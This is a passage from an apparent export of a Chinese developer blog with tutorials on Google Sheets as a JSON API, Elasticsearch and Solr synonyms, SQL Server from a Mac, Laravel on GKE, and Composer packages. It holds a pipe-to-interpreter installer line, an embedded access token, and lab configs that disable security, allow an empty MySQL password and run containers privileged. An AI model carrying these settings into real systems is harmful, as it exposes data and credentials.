qs=123 const spreadSheet = SpreadsheetApp.openById( \u0026#34;your-sheet-id\u0026#34; ); //取得第一個 tab const sheet = spreadSheet.getSheets()[0]; // 就跟 excel 一樣，A行~G行的第1列，google稱作 A1 notation const title = sheet.getRange(\u0026#34;A1:G1\u0026#34;).getValues()[0]; // 最後一列, 空白也算 const lastDataRowNumber = sheet.getLastRow(); // 取得列裡面的值 const rows = sheet .getRange(\u0026#34;A2:G\u0026#34; + lastDataRowNumber) .getValues(); // return as json return ContentService.createTextOutput(JSON.stringify(rows)).setMimeType( ContentService.MimeType.JSON) } function doPost(e){ // post action here } // 其實就是 javascript script editor 有提供中斷點進行 debug 如圖 4. publish\n點擊上方的publish::Deploy as web app，存取權限選擇Anyone,even anonymous後發布\n會取得一個 uri，這串就直接把 sheet 內的東西做為 json 取回拉～\n備註 一般帳號有 50000/day 的存取限制，建議可以搭配後端code避免 reach rate limit(假如流量真心多的話)\nReferences google app script google app script quotas ","permalink":"http://shachiku.life/2020/01/gsheet-as-json-api-using-google-app-script/","summary":"有些事情做了才知道，比如改 wording","title":"把 gsheet 當作 json api 使用"},{"contents":" ","permalink":"http://shachiku.life/2019/11/intro-to-microsoft-application-insights/","summary":"是一份沒有機會講的ppt","title":"Intro to Microsoft Application Insights"},{"contents":"同 solr 是基於 lucene 寫出來的開源搜尋引擎, 因此 filter, tokenizer, analyzer 的概念與 solr 是一致的\n現在 elasticsearch 已經到 7.4\nfilter, tokenizer, analyzer簡介 名詞 說明 tokenizer 把 input 拆分成 token 產出 token stream filter 接收 token stream 並進行處理(case/replace/drop\u0026hellip;) analyzer 在建立/搜尋索引的時候要怎麼處理特定類型的字串, 比如說upperFirstCase, 去掉介詞, 同義詞處理\u0026hellip;相當於tokenizer+filter 設定 Dockerfile(包含 ik 安裝) FROM elasticsearch:5.3.0 RUN ./bin/elasticsearch-plugin install -b https://github.com/medcl/elasticsearch-analysis-ik/releases/download/v5.3.0/elasticsearch-analysis-ik-5.3.0.zip # 記得先放 COPY ./synonym.txt /usr/share/elasticsearch/config/analysis/synonym.txt COPY ./stopwords.txt /usr/share/elasticsearch/config/analysis/stopwords.txt USER elasticsearch synonym.txt , 跟 =\u0026gt; 的意義同 solr 攝氏 =\u0026gt; 華氏 台灣,臺灣,臺灣黑熊 stopwords.txt\ndocker-compose.yml\nversion: \u0026#39;3\u0026#39; services: elasticsearch: build: . environment: - \u0026#39;http.host=0.0.0.0\u0026#39; - \u0026#39;transport.host=127.0.0.1\u0026#39; - \u0026#39;ES_JAVA_OPTS=-Xms512m -Xmx512m\u0026#39; - \u0026#39;xpack.security.enabled=false\u0026#39; - \u0026#39;ACCESS_TOKEN=e-D9WyQzxfRbpdFvFdhQ\u0026#39; ports: - \u0026#39;9200:9200\u0026#39; - \u0026#39;9300:9300\u0026#39; volumes: - \u0026#39;/path/to/local/index:/usr/share/elasticsearch/data\u0026#39; container_name: local_es 執行 記得把 Dockerfile 放在與 docker-compose.yml 同層\ndocker-compose up -d 測試 順利跑起來的話輸入 localhost:9200 可以看到 json 如下\n{ \u0026#34;name\u0026#34;: \u0026#34;imYjhHG\u0026#34;, \u0026#34;cluster_name\u0026#34;: \u0026#34;docker-cluster\u0026#34;, \u0026#34;cluster_uuid\u0026#34;: \u0026#34;Wq9XBSrlRN6371m4jggxUQ\u0026#34;, \u0026#34;version\u0026#34;: { \u0026#34;number\u0026#34;: \u0026#34;5.3.0\u0026#34;, \u0026#34;build_hash\u0026#34;: \u0026#34;3adb13b\u0026#34;, \u0026#34;build_date\u0026#34;: \u0026#34;2017-03-23T03:31:50.652Z\u0026#34;, \u0026#34;build_snapshot\u0026#34;: false, \u0026#34;lucene_version\u0026#34;: \u0026#34;6.4.1\u0026#34; }, \u0026#34;tagline\u0026#34;: \u0026#34;You Know, for Search\u0026#34; } [PUT]新增 index 直接打 localhost:9200/{indexname}?pretty\n[PUT] 設定 mappings(token的欄位與型態) \u0026amp; settings(如何處理token) { \u0026#34;index\u0026#34;: \u0026#34;{indexname}\u0026#34;, \u0026#34;body\u0026#34;: { \u0026#34;mappings\u0026#34;: { \u0026#34;metafield1\u0026#34;: { \u0026#34;properties\u0026#34;: { \u0026#34;field1\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;text\u0026#34; }, \u0026#34;field2\u0026#34;: { \u0026#34;analyzer\u0026#34;: \u0026#34;ik_syno_max\u0026#34;, \u0026#34;search_analyzer\u0026#34;: \u0026#34;ik_syno_smart\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;text\u0026#34; }, \u0026#34;field3\u0026#34;: { \u0026#34;analyzer\u0026#34;: \u0026#34;ik_syno_max\u0026#34;, \u0026#34;search_analyzer\u0026#34;: \u0026#34;ik_syno_smart\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;text\u0026#34; }, } }, \u0026#34;metafield2\u0026#34;: { \u0026#34;properties\u0026#34;: { \u0026#34;field1\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;text\u0026#34; }, \u0026#34;field2\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;long\u0026#34; }, \u0026#34;location\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;geo_point\u0026#34; } } } }, \u0026#34;settings\u0026#34;: { \u0026#34;analysis\u0026#34;: { \u0026#34;analyzer\u0026#34;: { \u0026#34;ik_syno_smart\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;custom\u0026#34;, \u0026#34;tokenizer\u0026#34;: \u0026#34;ik_smart\u0026#34;, \u0026#34;filter\u0026#34;: [ \u0026#34;filter_stop\u0026#34;, \u0026#34;filter_syno\u0026#34; ] }, \u0026#34;ik_syno_max\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;custom\u0026#34;, \u0026#34;tokenizer\u0026#34;: \u0026#34;ik_max_word\u0026#34;, \u0026#34;filter\u0026#34;: [ \u0026#34;filter_stop\u0026#34;, \u0026#34;filter_syno\u0026#34; ] } }, \u0026#34;filter\u0026#34;: { \u0026#34;my_synonym\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;synonym\u0026#34;, \u0026#34;synonyms_path\u0026#34;: \u0026#34;analysis/synonym.txt\u0026#34; }, \u0026#34;my_stopword\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;stop\u0026#34;, \u0026#34;stopwords_path\u0026#34;: \u0026#34;analysis/stopwords.txt\u0026#34; } } } } } } [POST]查看同義詞是否成功 // request { \u0026#34;text\u0026#34;: \u0026#34;流行性感冒\u0026#34;, \u0026#34;analyzer\u0026#34;: \u0026#34;ik_syno_smart\u0026#34;, \u0026#34;filter\u0026#34;: [\u0026#34;filter_syno\u0026#34;, \u0026#34;filter_stop\u0026#34;] } // response { \u0026#34;tokens\u0026#34;: [ { \u0026#34;token\u0026#34;: \u0026#34;流感\u0026#34;, \u0026#34;start_offset\u0026#34;: 0, \u0026#34;end_offset\u0026#34;: 5, \u0026#34;type\u0026#34;: \u0026#34;SYNONYM\u0026#34;, // 成功 \u0026#34;position\u0026#34;: 0 } ] } References filter, analyzer, tokenizer elasticsearch official document ","permalink":"http://shachiku.life/2019/10/setup-elasticsearch-synonym/","summary":"使用 docker 建立 elasticsearch 5.3 和 ik 分詞器","title":"設定 elasticsearch 同義詞"},{"contents":"將說明從安裝到設定的過程\n現在 solr 已經到 8.2 了, 但因為歷史包袱所以還是用 4.10\n設定 在本地建立core folder, 結構圖如下\ncores └── mycore ├── conf │ ├── _rest_managed.json │ ├── dataimport.properties │ ├── db-data-config.xml │ ├── protwords.txt │ ├── schema.xml │ ├── solrconfig.xml │ ├── stopwords.txt │ ├── stopwords_en.txt │ └── synonyms.txt ├── core.properties └── data/ 主要說明幾個檔案\ncore.properties 告訴 solr 要讀取的 core 資訊, 範例參考\nname=mycore config=solrconfig.xml schema=schema.xml dataDir=data solrconfig.xml 增加 dataimport\n\u0026lt;requestHandler name=\u0026#34;/dataimport\u0026#34; class=\u0026#34;org.apache.solr.handler.dataimport.DataImportHandler\u0026#34;\u0026gt; \u0026lt;lst name=\u0026#34;defaults\u0026#34;\u0026gt; \u0026lt;str name=\u0026#34;config\u0026#34;\u0026gt;db-data-config.xml\u0026lt;/str\u0026gt; \u0026lt;/lst\u0026gt; \u0026lt;/requestHandler\u0026gt; db-data-config.xml 設定要 import 的 data 的 query, 範例參考\n\u0026lt;dataConfig\u0026gt; \u0026lt;dataSource type=\u0026#34;JdbcDataSource\u0026#34; driver=\u0026#34;com.mysql.jdbc.Driver\u0026#34; url=\u0026#34;jdbc:mysql://localhost:3306/test\u0026#34; user=\u0026#34;myusername\u0026#34; password=\u0026#34;mypassword\u0026#34;/\u0026gt; \u0026lt;document name=\u0026#34;mydocument\u0026#34;\u0026gt; \u0026lt;entity name=\u0026#34;item\u0026#34; query=\u0026#34;SELECT * FROM your_table\u0026#34;\u0026gt; \u0026lt;field column=\u0026#34;ID\u0026#34; name=\u0026#34;id\u0026#34; /\u0026gt; \u0026lt;field column=\u0026#34;SNO\u0026#34; name=\u0026#34;no\u0026#34; /\u0026gt; \u0026lt;field column=\u0026#34;SNAME\u0026#34; name=\u0026#34;name\u0026#34; /\u0026gt; \u0026lt;field column=\u0026#34;STYPE\u0026#34; name=\u0026#34;type\u0026#34; /\u0026gt; \u0026lt;/entity\u0026gt; \u0026lt;/document\u0026gt; \u0026lt;/dataConfig\u0026gt; schema.xml \u0026lt;fields\u0026gt; \u0026lt;field name=\u0026#34;name\u0026#34; type=\u0026#34;text_syn\u0026#34; indexed=\u0026#34;true\u0026#34; stored=\u0026#34;true\u0026#34; required=\u0026#34;true\u0026#34; multiValued=\u0026#34;false\u0026#34; /\u0026gt; \u0026lt;field name=\u0026#34;type\u0026#34; indexed=\u0026#34;false\u0026#34; type=\u0026#34;string\u0026#34; stored=\u0026#34;true\u0026#34; required=\u0026#34;false\u0026#34; multiValued=\u0026#34;false\u0026#34; /\u0026gt; \u0026lt;field name=\u0026#34;no\u0026#34; indexed=\u0026#34;true\u0026#34; type=\u0026#34;int\u0026#34; stored=\u0026#34;true\u0026#34; required=\u0026#34;false\u0026#34; multiValued=\u0026#34;false\u0026#34; /\u0026gt; \u0026lt;field name=\u0026#34;id\u0026#34; indexed=\u0026#34;true\u0026#34; type=\u0026#34;int\u0026#34; stored=\u0026#34;true\u0026#34; required=\u0026#34;false\u0026#34; multiValued=\u0026#34;false\u0026#34; /\u0026gt; \u0026lt;/fields\u0026gt; \u0026lt;fieldType name=\u0026#34;text_syn\u0026#34; class=\u0026#34;solr.TextField\u0026#34; autoGeneratePhraseQueries=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;analyzer\u0026gt; \u0026lt;tokenizer class=\u0026#34;com.chenlb.mmseg4j.solr.MMSegTokenizerFactory\u0026#34; mode=\u0026#34;complex\u0026#34; dicPath=\u0026#34;/opt/solr-multicore/dics\u0026#34;/\u0026gt; \u0026lt;!-- 使用mmseg跑同義詞 tokenizer --\u0026gt; \u0026lt;charFilter class=\u0026#34;solr.HTMLStripCharFilterFactory\u0026#34;/\u0026gt; \u0026lt;!-- 對token做html strip --\u0026gt; \u0026lt;filter class=\u0026#34;solr.LowerCaseFilterFactory\u0026#34;/\u0026gt; \u0026lt;!-- 全部token轉小寫 --\u0026gt; \u0026lt;filter class=\u0026#34;solr.StopFilterFactory\u0026#34; ignoreCase=\u0026#34;true\u0026#34; words=\u0026#34;stopwords.txt\u0026#34;/\u0026gt; \u0026lt;!-- token參考停用字, 不一定要 --\u0026gt; \u0026lt;/analyzer\u0026gt; \u0026lt;/fieldType\u0026gt; synonym.txt # , 表示同等意思 # =\u0026gt; 表示用左側搜會用右側搜 # 但因為會先跑 token, 所以有要做同意的字也要把他設進 words.dic 裡面 台灣,臺灣 流行性感冒 =\u0026gt; 流感 TV =\u0026gt; Taiwan-Value 使用 docker-compose 安裝 上面的設定完成後跑下面的docker-compose.yml進行安裝, 附上相關 jar 的載點\nmmseg4j-core-1.10.0.jar、 mmseg4j-solr-2.2.0.jar、 mysql-connector-java-5.1.47.jar、 solr-dataimporthandler-4.10.4.jar、 solr-dataimporthandler-extras-4.10.4.jar\n關於 mysql 設定 參考 docker mysql\n關於字典檔 以 .dic 結尾\n檔案 說明 units.dic 單位詞(年月日時分秒\u0026hellip;) chars.dic 單一串字典 words.dic 想要被切出來的詞庫, 比如說「三生有幸」原本可能是「三」「生」「有」「幸」, 加入後就會直接被切成「三生有幸」 wordsXXXX.dic XXXX自定義, 主要是切開管理字典檔 除了最後一項尚上述的字典都有開源載點\ndocker-compose.yml version: \u0026#39;3\u0026#39; services: solr: image: geerlingguy/solr:4.10.4 container_name: local_solr4 ports: - \u0026#39;8983:8983\u0026#39; restart: always volumes: [ \u0026#39;./cores/mycore:/var/solr/mycore:rw\u0026#39;, # 保存core \u0026#39;./jars/mmseg4j-core-1.10.0.jar:/opt/solr/example/solr-webapp/webapp/WEB-INF/lib/mmseg4j-core-1.10.0.jar\u0026#39;, \u0026#39;./jars/mmseg4j-solr-2.2.0.jar:/opt/solr/example/solr-webapp/webapp/WEB-INF/lib/mmseg4j-solr-2.2.0.jar\u0026#39;, \u0026#39;./jars/mysql-connector-java-5.1.47.jar:/opt/solr/example/solr-webapp/webapp/WEB-INF/lib/mysql-connector-java-5.1.47.jar\u0026#39;, \u0026#39;./jars/solr-dataimporthandler-4.10.4.jar:/opt/solr/example/solr-webapp/webapp/WEB-INF/lib/solr-dataimporthandler-4.10.4.jar\u0026#39;, \u0026#39;./jars/solr-dataimporthandler-extras-4.10.4.jar:/opt/solr/example/solr-webapp/webapp/WEB-INF/lib/solr-dataimporthandler-extras-4.10.4.jar\u0026#39;, \u0026#39;./dict:/opt/solr-multicore/dics/\u0026#39; # 自定義字典檔, 可以去開源詞庫抓獲自行定義 ] command: - \u0026#39;/opt/solr/bin/solr start -p 8983 -s /var/solr -m 1024m -f\u0026#39; mysql: image: mysql:5.7 volumes: - ./mysql/var/lib/mysql:/var/lib/mysql environment: MYSQL_ALLOW_EMPTY_PASSWORD: yes ports: - \u0026#34;3306:3306\u0026#34; privileged: true 測試 安裝成功後開啟瀏覽器輸入localhost:8983 會看到 solr 的 UI, 選擇mycore跑完full-import後點擊Analysis頁籤\n於選擇建立的欄位進行測試如圖 輸入有寫在 synonym.txt 裡面的字串進行分析, 有看到如下圖結果表示成功 References 碼上會！ mmseg4j 中文斷詞java 實作 (55行) solr filter solr tokenizer ","permalink":"http://shachiku.life/2019/09/setup-solr-synonym/","summary":"使用 docker 建立 solr 4.10 並用 mmseg 切字","title":"設定 solr 同義詞"},{"contents":"前陣子需要用 mac 連 sql server, 記錄一下\n這裡用DSN連線\nStep1 安裝driver 使用 brew\nbrew update brew install unixodbc freetds Step2 修改 odbc 設定 in /usr/local/etc/odbcinst.ini\n[FreeTDS] Description=FreeTDS Driver for Mac \u0026amp; MSSQL Driver=/usr/local/lib/libtdsodbc.so # 這兩個 .so 在下 brew install unixodbc 的時候會自己裝到這 Setup=/usr/local/lib/libtdsodbc.so UsageCount=1 in /usr/local/etc/odbc.ini\n[TEST_DB] # DSN名稱, 要跟 freetds.conf 的 name mapping Description = test_db # 隨便 Driver = FreeTDS # 要跟 odbcinst.ini 的 name mapping Servername = TEST_DB # 隨便 in /usr/local/etc/freetds.conf\n[TEST_DB] host = sqlserver host port = sqlserver port tds version = 7.3 # version 說明參考 https://www.freetds.org/userguide/choosingtdsprotocol.htm Step3 測試連線 設定完成後用command測試能否連上\ntsql -S TEST_DB -U username -P password 下完有看到類似下面的畫面表示成功\nlocale is \u0026#34;zh_TW.UTF-8\u0026#34; locale charset is \u0026#34;UTF-8\u0026#34; using default charset \u0026#34;UTF-8\u0026#34; 1\u0026gt; python 連線範例 安裝必要套件\npip install sqlalchemy pyodbc 範例如下\nfrom sqlalchemy import create_engine namespace = YOUR_NAME_SPACE account = YOUR_ACCOUNT password = YOUR_PASSWORD DSN = \u0026#39;TEST_DB\u0026#39; engine = create_engine( f\u0026#39;mssql+pyodbc://{namespace}\\\\{account}:{password}@{DSN}\u0026#39;) con = engine.connect() # more sample @see https://kite.com/python/docs/sqlalchemy.dialects.mssql.pyodbc Reference Connecting to SQL Server from Mac OSX ","permalink":"http://shachiku.life/2019/09/mac-connect-to-sql-server/","summary":"以 python 為例","title":"Mac Connect to SQL Server"},{"contents":"內文僅記錄主要概念\n最近有機會接觸到 GKE 相關的東西, 趁記憶猶新趕緊紀錄一下, 流程大概為\\\n開啟 GKE instance\\ 建立 \u0026amp; push laravel app docker image to GCR\\ 撰寫 yaml 檔並把程式部署到 GKE 上 GKE: 由 google 推出的 k8s engine 代管服務, 其他還有 AWS 的 EKS, M$ 的 AKS\n前置作業 GKE quickstart\n名詞解釋 在 k8s 中有多種類型的 resource objects, 下面簡單介紹本文所需知道的類型\n資源名稱 簡單說明 pod 組成的最小單位, 可由單一或是多個 container 組成, 撰寫 yaml 時建議直接用 deployment node 實際提供 pods 環境的機器(虛擬 or 實體) deployment pods instance template service 定義了如何連到 pods 的方式(protocol, port, kind) ingress think as L7 LBS(F5) configmap 可在runtime時再把設定檔綁到特定的 pods 上, 讓設定更加彈性 persistentvolume short for pv, think as external HD persistentvolumeclaims short for pvc, 存取pv的抽象層, 建好的 pv 需要透過 pvc 才能被掛載, 類似用 deploy 去掛 pod 的感覺 service.NodePort 讓叢集對外的最原始方式, 直接在 node 上開個 port service.ClusterIP 預設的service type, 叢集中提供一個 cluster-internal ip讓叢集內/間的 pods 可以直接存取 service.LoadBalancer 一般對外的方式, 有需要的請參考官方說明 Ingress 不是 service type, 但能夠做到巷一台 L7 的服務掛給你對外 建立資源指令 有兩種方法使用kubectl告訴 k8s 你要建立的資源, 分別是create(命令式)和apply(宣告式)\n這裡沒有找到比較好的解釋說明兩者的差異, 我個人是偏好不變的資源用 create, 因為兩種command 建立出來的資源是在 command 中是互斥的, 避免 apply 倒不會動的資源\n# 1. create resource kubectl create -f xxxx.yml # or kubectl apply -f xxxx.yml # 2. reload resource kubectl replace -f xxxx.yml # use create # or kubectl apply -f xxxx.yml # use apply 預計建立架構 建立 laravel app image \u0026amp; push to GCR 安裝完laravel之後寫個 Dockerfile build image, 參考如下\nDockerfile.php FROM php:7.3.3 RUN apt-get update -y \u0026amp;\u0026amp; apt-get install -y openssl zip unzip git RUN curl -sS https://getcomposer.org/installer | php -- --install-dir=/usr/local/bin --filename=composer RUN docker-php-ext-install pdo mbstring json sockets WORKDIR /app COPY MyProject /app RUN composer install RUN chown -R www-data:www-data /app/ USER www-data CMD php artisan serve --host=0.0.0.0 --port=8000 #實務上不會這樣做, 本文只是為了可以建立環境所以這樣做 EXPOSE 8000 build \u0026amp; push image docker build -t phpapp:1.0.0 -f Dockerfile.php . # then docker push gcr.io/{your-gcp-project-name}/phpapp:1.0.0 # 這裡以 gcr 為例, 推到 dockerhub 也可以, 總之要有一個本地連的到的地方 yaml 這裡直接把 deploy 跟 service 寫在一起\nnginx-k8s.yml apiVersion: v1 data: nginx.conf: | user nginx; error_log stderr warn; events {} http { server { listen 80; location / { proxy_pass http://phpapp-local:7777; } } } kind: ConfigMap metadata: name: nginx-config-local # configmap\u0026#39;s name --- apiVersion: extensions/v1beta1 kind: Deployment metadata: name: nginx-local spec: replicas: 1 # 建立幾個 pods template: metadata: labels: app: nginx # 建議需要設定 labels, 讓 service 可以透過 selector 選取 spec: containers: - name: nginx image: nginx ports: - containerPort: 80 resources: # 不設定也可, 但就不知道 k8s 會怎麼分配 limits: # upper bound memory: 50Mi requests: # lower bound cpu: 10m # 1000m = 1CPU volumeMounts: # 要 mount 的資源資訊 - name: config-volume mountPath: /etc/nginx # 掛載到此 pod 上的路徑 volumes: - name: config-volume # 被 mount 的資源 key 與其設定 configMap: name: nginx-config-local # 對應上面的 configmap\u0026#39;s name --- apiVersion: v1 kind: Service metadata: name: nginx-local spec: ports: - port: 80 # service\u0026#39;s port targetPort: 80 # pod\u0026#39;s port selector: app: nginx # 這裡用 select 對應到實際的 deployment type: NodePort # 要注意的是, Ingress 目前只支援 NodePort, 如果不用 Ingress 的話可使用 ClusterIP php-k8s.yml apiVersion: extensions/v1beta1 kind: Deployment metadata: name: phpapp-local spec: # pods instance strategy: type: RollingUpdate replicas: 1 template: metadata: labels: app: phpapp spec: terminationGracePeriodSeconds: 10 containers: - name: php image: gcr.io/{your-project-name}/phpapp:latest imagePullPolicy: IfNotPresent resources: limits: memory: 100Mi requests: cpu: 50m ports: - containerPort: 8000 --- apiVersion: v1 kind: Service metadata: name: phpapp-local spec: ports: - port: 7777 # cluster 的 port targetPort: 8000 selector: app: phpapp type: ClusterIP mysql.yml\n這裡用 cloudSQL, credential 的部分指的是 service account 金鑰, 有幾種方式設定 # 1. use kubectl (recommend) kubectl create secret generic {secret-name} --from-file /path/to/service-account.json # 2. use shell cat /path/to/service-account.json | base64 # then paste to cloudsql-instance-credentials.yml 先跑完 credential 再跑下面的 yml, 不然跑的時候會找不到\ncloudsql-instance-credentials.yml 用 kubectl create 後也會建立此檔, 使用方法 2 的話可以先建立後再copy-paste apiVersion: v1 kind: Secret metadata: name: cloudsql-instance-credentials type: Opaque # k8s 提供的一種非明碼儲存方式, 使用 `kubectl create secret generic`也會產生一樣的檔案 data: # base64 encoded service-account.json service-account.json: xxxxxxxxxxx= cloudsql.yml apiVersion: extensions/v1beta1 kind: Deployment metadata: name: cloudsql-proxy spec: replicas: 1 template: metadata: labels: component: cloudsql-proxy spec: containers: - name: cloudsql-proxy image: gcr.io/cloudsql-docker/gce-proxy:1.14 ports: - containerPort: 3306 command: - /cloud_sql_proxy - -instances={gcp-project-name}:{cloud-sql-region}:{cloud-sql-database-name}=tcp:0.0.0.0:3306 - -credential_file=/secrets/cloudsql/{your-service-account.json} # 具有讀寫 cloudsql database 權限的service account 金鑰檔 volumeMounts: - name: cloudsql-instance-credentials mountPath: /secrets/cloudsql readOnly: true volumes: - name: cloudsql-instance-credentials secret: secretName: cloudsql-instance-credentials --- apiVersion: v1 kind: Service metadata: name: cloudsql-proxy-service spec: ports: - protocol: TCP port: 3306 targetPort: 3306 selector: component: cloudsql-proxy redis.yml apiVersion: extensions/v1beta1 kind: Deployment metadata: name: redis-pod spec: replicas: 1 template: metadata: labels: app: redis-pod spec: containers: - name: redis image: redis:5.0.5 imagePullPolicy: IfNotPresent ports: - containerPort: 6379 --- apiVersion: v1 kind: Service metadata: name: redis-svc # 記得把 laravel 的 env 中 redis 連線名稱改為這個 spec: ports: - port: 6379 targetPort: 6379 protocol: TCP selector: app: redis-pod type: ClusterIP ingress.yml\n不一定要用ingress, 也可以使用 LoadBalancer apiVersion: extensions/v1beta1 kind: Ingress metadata: name: ingress annotations: kubernetes.io/ingress.global-static-ip-name: \u0026#34;external-ip-name\u0026#34; # 預留外部靜態ip的名稱, @see [GCP保留靜態IP位址](https://cloud.google.com/compute/docs/ip-addresses/reserve-static-external-ip-address?hl=zh-tw) spec: backend: serviceName: nginx-local #必須為 NodePort, 名稱為 nginx-k8s.yml 的 metadata servicePort: 80 備註 nginx 跟 php 做分拆的話會有靜態檔案的問題, 這邊還沒想到一個很好的解法, 之前嘗試過的解法是用k8s的 pv(persistentVolume) + pvc(persistentVolumeClaim) 去掛可以掛 ROX(目前 GCE 還不支援) 的 disk 來做到多個 replicas 的時候也能正確 mount 新的靜態檔案 圖檔之類的東西應該不適合丟在 pv 做, 畢竟流量就是$$ 上面的 yml 有蠻多細節沒補到, 如果有拿去 try 的要稍微研究一下拉~ References k8s overview k8s pods concept 介紹 k8s 的中文部落格 k8s resource types k8s service 概念詳解 k8s label and selector (github issue) Ingress Controller for ClusterIP service type Ingress, ClusterIP and NodePort compression gke connect to cloudsql setup kubectl create vs apply GCP保留靜態IP位址 k8s persistentVolume ","permalink":"http://shachiku.life/2019/07/deploy-laravel-app-to-gke/","summary":"這是一篇 quick guide about 建立三層\u003cdel\u003e肉\u003c/del\u003e式架構","title":"部署laravel應用程式到GKE上"},{"contents":"前陣子遇到使用的套件有相依套件的衝突，發 PR 套件原作者發現上次更新時間是 500 年前，所以就研究了一下怎麼只裝自己 fork 的版本\n設定如下\ncomposer.json { ... \u0026#34;repositories\u0026#34;: [ { \u0026#34;type\u0026#34;: \u0026#34;vcs\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://github.com/{yourname}/package\u0026#34; } ], \u0026#34;require\u0026#34;: { \u0026#34;vendor/package\u0026#34;: \u0026#34;dev-{your fork branch name}\u0026#34; } } 建議 branch name 切開，不要用 master\nReference https://getcomposer.org/doc/05-repositories.md#vcs ","permalink":"http://shachiku.life/2019/06/install-custom-composer-package/","summary":"人在做，天沒在看","title":"安裝 fork 過來的 composer 套件"},{"contents":"注意事項 路徑要符合 PSR-4 規範，autoload 才找得到 使用 git-tag 對 package 版號控管 套件內的 composer.json 的 require 很重要，如果有相依於 laravel 版本的話要注意 資料夾呈現結果如圖\n接下來說明步驟\n開發 Step1. 建立專案 這裡以 5.5 為例\ncd /path/to/your/package-develop-project \u0026amp;\u0026amp; composer create-project --prefer-dist laravel/laravel . \u0026#34;5.5.*\u0026#34; Step2. 建立 package 開發路徑 於 laravel documentroot 建立 packages folder, path如下\npackages/{vendor-name}/{package-name}/src 並於 src 層使用composer init填入相關資料，以下是我的範例\n{ \u0026#34;name\u0026#34;: \u0026#34;cw/kafkalogger\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;send log direct into kafka\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;library\u0026#34;, \u0026#34;license\u0026#34;: \u0026#34;MIT\u0026#34;, \u0026#34;authors\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;whchi\u0026#34;, \u0026#34;email\u0026#34;: \u0026#34;whccchi@gmail.com.tw\u0026#34; } ], \u0026#34;minimum-stability\u0026#34;: \u0026#34;dev\u0026#34;, \u0026#34;require\u0026#34;: { \u0026#34;php\u0026#34;: \u0026#34;\u0026gt;=7.1\u0026#34;, \u0026#34;laravel/framework\u0026#34;: \u0026#34;5.5.*\u0026#34;, \u0026#34;Psr/Log\u0026#34;: \u0026#34;1.0.2\u0026#34;, \u0026#34;nmred/kafka-php\u0026#34;: \u0026#34;v0.2.0.8\u0026#34; }, \u0026#34;autoload\u0026#34;: { \u0026#34;psr-4\u0026#34;: { \u0026#34;Cw\\\\KafkaLogger\\\\\u0026#34;: \u0026#34;src/\u0026#34; } } } 要注意的地方是\n{ \u0026#34;require\u0026#34;: { ... \u0026#34;laravel/framework\u0026#34;: \u0026#34;5.5.*\u0026#34;, ... }, ... \u0026#34;autoload\u0026#34;: { \u0026#34;psr-4\u0026#34;: { \u0026#34;Cw\\\\KafkaLogger\\\\\u0026#34;: \u0026#34;src/\u0026#34; } } } 這兩個地方要填正確\nStep3. 調整根目錄 composer.json，以利測試 回到你的 laravel app 根目錄，修改 composer.json如下\n{ ... \u0026#34;psr-4\u0026#34;: { \u0026#34;App\\\\\u0026#34;: \u0026#34;app/\u0026#34;, \u0026#34;Cw\\\\KafkaLogger\\\\\u0026#34;: \u0026#34;packages/cw/kafkalogger/src/\u0026#34; } } 設定好後 composer dump-autoload\nStep4. 建立 ServiceProvider 用 ServiceProvider 是因為有 register 跟 boot，不需要的話可以用其他方式建立\n懶得打字的話直接用 php artisan make:provider YourServiceProvider，再把它 copy 到 src 底下，參考程式範例如下\n\u0026lt;?php namespace Cw\\KafkaLogger; use Illuminate\\Support\\ServiceProvider; class KafkaLogServiceProvider extends ServiceProvider { /** * Bootstrap the application services. * * @return void */ public function boot() { // } /** * Register the application services. * * @return void */ public function register() { var_dump(\u0026#39;hello my package\u0026#39;); } } 並在 config/app.php 加入包含 namespace 的 provider\n\u0026#39;providers\u0026#39; =\u0026gt; [ ... Cw\\KafkaLogger\\KafkaLogServiceProvider::class, ... ] Step5. 進行測試 使用內建的 server 即可測試php artisan serve，進到首頁看到如圖結果表示成功 部署至 github 跟一般的部屬一樣，但假如是開 private repo 的話要申請 token\n使用 git-tag 進行版本控管 composer 對於使用 git 進行版控的 package 的版本定義是使用 tag，原因參考這裡，因此在部署時記得要把 tag 一起推上去，操作如列表\n說明 指令 add local tag git tag -a {版本號} -m '非必要的描述' add remote tag git push --tags remove local tag git tag -d {版本號} add remote tag git push --delete [remotereponame] {版本號}，不指定則為 origin 使用 composer 安裝 部署上去最的目的是使用 composer 安裝，composer 有指定 package 要去哪抓的設定，參考設定如下\n{ \u0026#34;require-dev\u0026#34;: { \u0026#34;cw/kafkalogger\u0026#34;: \u0026#34;1.0.*\u0026#34;, ... }, \u0026#34;autoload\u0026#34;: { ... \u0026#34;psr-4\u0026#34;: { \u0026#34;App\\\\\u0026#34;: \u0026#34;app/\u0026#34; } }, ... \u0026#34;repositories\u0026#34;: [ { \u0026#34;type\u0026#34;: \u0026#34;vcs\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;git@ssh.dev.azure.com:v3/cwgroup/digital-products/kafkalogger\u0026#34; } ] } 記得把 autoload 改回原本的樣子\nReference 如何開發自已的Package? 標籤跟分支有什麼不一樣? ","permalink":"http://shachiku.life/2019/03/laravel-package/","summary":"最近花了點時間把以前寫的東西改成laravel package，留個筆記","title":"開發並部署 laravel package 到 github 上"},{"contents":" create layouts/shortcodes folder if not exists add gist.html and past follow code below then you can use it in your .md file by {{\u0026lt; gist embedhash \u0026gt;}}\nReference http://blog.cronally.com/embed-gists-with-hugo/ ","permalink":"http://shachiku.life/2018/12/hugo-shortcodes-with-gist/","summary":"embed gist","title":"Hugo shortcodes With embed gist"},{"contents":"簡單解釋一下\nELK 是什麼 Elasticsearch + Logstash + Kibana = ELK\nElasticsearch: 搜尋引擎，類似的有 luence / solr Logstash: 搜集 log 的服務，可透過撰寫設定檔的方式指定不同的 input / 